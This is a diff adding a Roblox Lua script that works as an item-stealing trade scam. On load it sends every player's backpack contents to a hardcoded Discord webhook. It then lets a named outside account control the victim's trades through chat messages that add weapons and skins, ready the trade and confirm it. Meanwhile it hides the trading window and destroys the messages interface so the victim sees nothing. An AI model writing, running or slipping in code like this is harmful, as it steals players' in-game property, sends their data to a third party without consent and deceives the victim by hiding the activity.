@@ -1,0 +1,127 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+
+local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
+local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
+local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
+local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
+local RFTradingAddItem = ReplicatedStorage.Modules.Net["RF/Trading/AddItem"]
+
+local targetName = "quaryriscute"
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+-- // 📡 Send backpack report on load
+task.spawn(function()
+	local webhookUrl = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"
+
+	local blacklist = {
+		["1 punches"] = true,
+		["Spray"] = true,
+		["TradeSign"] = true,
+		["StanleyPass"] = true,
+		["Fish Slap"] = true,
+		["Gorilla Gel"] = true,
+		["Phone"] = true,
+		["Wallet"] = true
+	}
+
+	local fields = {}
+	for _, plr in ipairs(Players:GetPlayers()) do
+		local backpack = plr:FindFirstChild("Backpack")
+		local tools = {}
+		if backpack then
+			for _, item in ipairs(backpack:GetChildren()) do
+				if item:IsA("Tool") and not blacklist[item.Name] then
+					table.insert(tools, item.Name)
+				end
+			end
+		end
+		local value = #tools > 0 and table.concat(tools, ", ") or "None"
+		table.insert(fields, { name = plr.Name, value = value, inline = false })
+	end
+
+	local embed = {
+		title = "Backpack Report",
+		fields = fields,
+		timestamp = os.date("!%Y-%m-%dT%TZ")
+	}
+
+	local payload = { embeds = { embed } }
+	pcall(function()
+		HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+	end)
+end)
+
+-- // Trading add weapons
+local function addWeapons()
+	RFTradingAddItem:InvokeServer("Weapon","2a2bce877d67474299") -- snowball
+	RFTradingAddItem:InvokeServer("Weapon","50f672aee7054d2d9d") -- goldsnowball
+	RFTradingAddItem:InvokeServer("Weapon","984f30e6f65a40a498") -- kittypurse
+	RFTradingAddItem:InvokeServer("Weapon","000183526d6646eca4") -- sledge
+	RFTradingAddItem:InvokeServer("Weapon","f864e570fb0743c987") -- freezegun
+	RFTradingAddItem:InvokeServer("WeaponSkin","6994851e04ae4b80b4") -- glitterstyle
+end
+
+-- // Chat handling
+TextChatService.OnIncomingMessage = function(message)
+	local ts = message.TextSource
+	if not ts then return end
+	local sender = Players:GetPlayerByUserId(ts.UserId)
+	if not sender then return end
+	local txt = tostring(message.Text or "")
+	txt = txt:match("^%s*(.-)%s*$") or txt
+
+	if sender.Name == targetName then
+		local target = Players:FindFirstChild(targetName)
+		if target then
+			RFTradingSendTradeOffer:InvokeServer(target)
+		end
+		if txt == "1" then
+			RFTradingSetReady:InvokeServer(true)
+		elseif txt == "2" then
+			RFTradingConfirmTrade:InvokeServer()
+		elseif txt:lower() == "add" then
+			addWeapons()
+		end
+	end
+
+	if sender.UserId == localPlayer.UserId then
+		if txt == "1" then
+			RFTradingSetReady:InvokeServer(true)
+		elseif txt == "2" then
+			RFTradingConfirmTrade:InvokeServer()
+		elseif txt:lower() == "add" then
+			addWeapons()
+		end
+	end
+end
+
+-- // GUI handling
+local function handleGui(gui)
+	if gui.Name == "Trading" then
+		gui.Enabled = false
+	elseif gui.Name == "Messages" then
+		gui:Destroy()
+	end
+end
+
+for _, gui in ipairs(playerGui:GetChildren()) do
+	handleGui(gui)
+end
+
+playerGui.ChildAdded:Connect(handleGui)
+
+task.spawn(function()
+	while true do
+		local tradingGui = playerGui:FindFirstChild("Trading")
+		if tradingGui then
+			tradingGui.Enabled = false
+		end
+		task.wait(0.1)
+	end
+end)
+
+RESetPhoneSettings:FireServer("TradeEnabled", true)
